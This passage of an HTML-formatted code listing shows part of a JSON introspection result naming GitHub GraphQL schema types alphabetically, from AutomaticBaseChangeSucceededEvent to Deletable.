&#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutomaticBaseChangeSucceededEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Base64String&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BaseRefChangedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BaseRefDeletedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BaseRefForcePushedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Blame&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BlameRange&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Blob&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Boolean&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Bot&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchActorAllowanceActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConflict&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConflictConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConflictEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassForcePushAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassForcePushAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassForcePushAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassPullRequestAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassPullRequestAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassPullRequestAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CVSS&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CWE&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CWEConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CWEEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelEnterpriseAdminInvitationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelEnterpriseAdminInvitationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelSponsorshipInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelSponsorshipPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ChangeUserStatusInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ChangeUserStatusPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationLevel&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationPosition&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationRange&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationSpan&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckConclusionState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRun&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunAction&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunFilter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunOutput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunOutputImage&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStep&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStepConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStepEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuite&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteAutoTriggerPreference&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteFilter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClearLabelsFromLabelableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClearLabelsFromLabelablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneTemplateRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneTemplateRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Closable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloseIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloseIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClosePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClosePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClosedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Closer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeOfConduct&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CollaboratorAffiliation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Comment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommentAuthorAssociation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommentCannotUpdateReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommentDeletedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Commit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitAuthor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitCommentThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitContributionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitContributionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitHistoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitMessage&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommittableBranch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConnectedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Contribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendar&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendarDay&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendarMonth&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendarWeek&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionLevel&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionsCollection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertProjectCardNoteToIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertProjectCardNoteToIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertPullRequestToDraftInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertPullRequestToDraftPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertToDraftEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertedNoteToIssueEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertedToDiscussionEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateBranchProtectionRuleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateBranchProtectionRulePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckRunInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckRunPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckSuiteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckSuitePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCommitOnBranchInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCommitOnBranchPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnterpriseOrganizationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnterpriseOrganizationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnvironmentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnvironmentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIpAllowListEntryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIpAllowListEntryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateMigrationSourceInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateMigrationSourcePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRefInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRefPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorsTierInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorsTierPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorshipInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorshipPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedCommitContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedCommitContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedCommitContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueOrRestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestOrRestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestReviewContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestReviewContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestReviewContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryOrRestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CrossReferencedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Date&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DateTime&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeclineTopicSuggestionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeclineTopicSuggestionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DefaultRepositoryPermissionField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Deletable&quot;</span></span><br><span class="line">        